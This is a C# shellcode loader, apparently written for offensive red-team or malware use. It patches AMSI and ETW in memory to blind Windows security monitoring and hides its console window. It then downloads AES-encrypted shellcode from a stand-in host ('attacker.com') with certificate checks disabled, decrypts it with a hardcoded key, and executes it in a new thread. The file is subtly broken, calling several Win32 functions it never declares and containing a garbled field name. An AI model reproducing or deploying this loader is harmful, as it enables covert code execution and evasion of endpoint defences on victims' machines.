using System;
using System.IO;
using System.Net;
using System.Text;
using System.Security.Cryptography.X509Certificates;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

// inspiration from: https://github.com/H0K5/defcon27_csharp_workshop


public class Win32
{
    [StructLayout(LayoutKind.Sequential)]
    public class SecurityAttributes
    {
        public Int32 Length = 0;
        public IntPtr lpSecurityDeshellcoderiptor = IntPtr.Zero;
        public bool bInheritHandle = false;
        public SecurityAttributes() { this.Length = Marshal.SizeOf(this); }
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct ProcessInformation
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public Int32 dwProcessId;
        public Int32 dwThreadId;
    }
    [StructLayout(LayoutKind.Sequential)]
    public class StartupInfo
    {
        public Int32 cb = 0;
        public IntPtr lpReserved = IntPtr.Zero;
        public IntPtr lpDesktop = IntPtr.Zero;
        public IntPtr lpTitle = IntPtr.Zero;
        public Int32 dwX = 0;
        public Int32 dwY = 0;
        public Int32 dwXSize = 0;
        public Int32 dwYSize = 0;
        public Int32 dwXCountChars = 0;
        public Int32 dwYCountChars = 0;
        public Int32 dwFillAttribute = 0;
        public Int32 dwFlags = 0;
        public Int16 wShowWindow = 0;
        public Int16 cbReserved2 = 0;
        public IntPtr lpReserved2 = IntPtr.Zero;
        public IntPtr hStdInput = IntPtr.Zero;
        public IntPtr hStdOutput = IntPtr.Zero;
        public IntPtr hStdError = IntPtr.Zero;
        public StartupInfo() { this.cb = Marshal.SizeOf(this); }
    }
    [Flags]
    public enum CreateProcessFlags : uint
    {
        DEBUG_PROCESS = 0x00000001,
        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
        CREATE_SUSPENDED = 0x00000004,
        DETACHED_PROCESS = 0x00000008,
        CREATE_NEW_CONSOLE = 0x00000010,
        NORMAL_PRIORITY_CLASS = 0x00000020,
        IDLE_PRIORITY_CLASS = 0x00000040,
        HIGH_PRIORITY_CLASS = 0x00000080,
        REALTIME_PRIORITY_CLASS = 0x00000100,
        CREATE_NEW_PROCESS_GROUP = 0x00000200,
        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
        CREATE_SEPARATE_WOW_VDM = 0x00000800,
        CREATE_SHARED_WOW_VDM = 0x00001000,
        CREATE_FORCEDOS = 0x00002000,
        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
        INHERIT_PARENT_AFFINITY = 0x00010000,
        INHERIT_CALLER_PRIORITY = 0x00020000,
        CREATE_PROTECTED_PROCESS = 0x00040000,
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
        PROCESS_MODE_BACKGROUND_END = 0x00200000,
        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
        CREATE_NO_WINDOW = 0x08000000,
        PROFILE_USER = 0x10000000,
        PROFILE_KERNEL = 0x20000000,
        PROFILE_SERVER = 0x40000000,
        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
    }  
    [DllImport("kernel32")]
    public static extern IntPtr CreateProcessA(String lpApplicationName, String lpCommandLine, 
        SecurityAttributes lpProcessAttributes, SecurityAttributes lpThreadAttributes, 
        Boolean bInheritHandles, CreateProcessFlags dwCreationFlags, IntPtr lpEnvironment, 
        String lpCurrentDirectory, [In] StartupInfo lpStartupInfo, 
        out ProcessInformation lpProcessInformation);
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, 
        UInt32 flAllocationType, UInt32 flProtect);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
        UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, 
        byte[] buffer, IntPtr dwSize, int lpNumberOfBytesWritten);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, 
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, 
        IntPtr lpThreadId);
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool FreeLibrary(IntPtr hModule);
    [DllImport("kernel32")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);   
    public static int PROCESS_CREATE_THREAD = 0x0002;
    public static int PROCESS_QUERY_INFORMATION = 0x0400;
    public static int PROCESS_VM_OPERATION = 0x0008;
    public static int PROCESS_VM_WRITE = 0x0020;
    public static int PROCESS_VM_READ = 0x0010;
    public static UInt32 MEM_COMMIT = 0x1000;
    public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
    public static UInt32 PAGE_EXECUTE_READ = 0x20;
    public static UInt32 PAGE_READWRITE = 0x04;
    public static int SW_HIDE = 0;
}

public class Encrypt
{
    public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
    {
        byte[] decryptedBytes = null;
        byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
        using (MemoryStream ms = new MemoryStream())
        {
            using (RijndaelManaged AES = new RijndaelManaged())
            {
                AES.KeySize = 256;
                AES.BlockSize = 128;
                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                AES.Key = key.GetBytes(AES.KeySize / 8);
                AES.IV = key.GetBytes(AES.BlockSize / 8);
                AES.Mode = CipherMode.CBC;
                using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                    cs.Close();
                }
                decryptedBytes = ms.ToArray();
            }
        }
        return decryptedBytes;
    }
}

public class EVASION
{   
    static byte[] amsix64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    static byte[] amsix86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
    static byte[] etwx64 = new byte[] { 0x48, 0x33, 0xc0, 0xc3 };
    static byte[] etwx86 = new byte[] { 0x33, 0xc0, 0xc2, 0x14, 0x00 };

 
    public static void PatchAll()
    {
        PatchETW();
        PatchASB();
    }
    public static void PatchETW()
    {
        if (IntPtr.Size == 8)
        {
            Console.WriteLine("[>] 64-bits Process");
            PatchMem(etwx64, "ntdll.dll", "RtlInitializeResource", 0x1ed60); 
        }
        else 
        {
            Console.WriteLine("[>] 32-bits Process");
            PatchMem(etwx86, "ntdll.dll", "RtlInitializeResource", 0x590); // 0x590 to EtwEventWrite
        }
    }
    public static void PatchASB()
    {
        if (IntPtr.Size == 8)
        {
            Console.WriteLine("[>] 64-bits Process");
            PatchMem(amsix64, "amsi.dll", "DllGetClassObject", 0xcb0); 
        }
        else
        {
            Console.WriteLine("[>] 32-bits Process");
            PatchMem(amsix86, "amsi.dll", "DllGetClassObject", 0x970); 
        }
    }

    private static void PatchMem(byte[] patch, string library, string function, Int64 offset = 0)
    {
        try
        {
            uint newProtect;
            uint oldProtect;

            IntPtr libPtr = Win32.LoadLibrary(library);
            Console.WriteLine("[>] {0}: 0x{1}", library, libPtr.ToString("X"));

            IntPtr functionPtr = Win32.GetProcAddress(libPtr, function);

            if (offset != 0)
            {
                functionPtr = new IntPtr(functionPtr.ToInt64() + offset);
                Console.WriteLine("[>] {0} + 0x{1} address: 0x{2}", function, offset.ToString("X"), functionPtr.ToString("X"));
            }
            else { Console.WriteLine("[>] {0} address: 0x{1}", function, functionPtr.ToString("X")); }

            Win32.VirtualProtect(functionPtr, (UIntPtr)patch.Length, 0x40, out oldProtect);

            Marshal.Copy(patch, 0, functionPtr, patch.Length);

            Win32.VirtualProtect(functionPtr, (UIntPtr)patch.Length, oldProtect, out newProtect);
            Win32.FreeLibrary(libPtr);
            Console.WriteLine("[+] Patch Done");
        }
        catch (Exception e)
        {
            Console.WriteLine(" [!] {0}", e.Message);
            Console.WriteLine(" [!] {0}", e.InnerException);
        }
    }
}


public class Program
{
    public static void RunShellcode(byte[] shellcode)
    {
        UInt32 codeAddr = Win32.VirtualAlloc(0, (UInt32)shellcode.Length, Win32.MEM_COMMIT, Win32.PAGE_READWRITE);
        Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
        uint oldProtect;
        Win32.VirtualProtect((IntPtr)codeAddr, (UIntPtr)shellcode.Length, Win32.PAGE_EXECUTE_READ, out oldProtect);
        IntPtr threadHandle = IntPtr.Zero;
        UInt32 threadId = 0;
        IntPtr parameter = IntPtr.Zero;
        threadHandle = Win32.CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
        Win32.WaitForSingleObject(threadHandle, 0xFFFFFFFF);

    }

    public static byte[] downloader(string shellcode_url)
    {
        WebClient wc = new WebClient();
        wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
        ServicePointManager.Expect100Continue = true;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
        byte[] shellcode = wc.DownloadData(shellcode_url);
        return shellcode;
    }


    public static void Main(string[] args)
    {
        EVASION.PatchAll();
        var handle = Win32.GetConsoleWindow();
        Win32.ShowWindow(handle, Win32.SW_HIDE);
        string url = args[0];
        byte[] shellcode = downloader("https://attacker.com/shellcode");
        byte[] password = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes("key"));
        Console.WriteLine("[<] {0} Bytes Downloaded!", shellcode.Length);
        shellcode = Encrypt.AES_Decrypt(shellcode, password);
        Console.WriteLine("[+] Decrypted shellcode size: {0}", shellcode.Length);
        Console.WriteLine("[!] Executing shellcode!");
        RunShellcode(shellcode);
    }
}
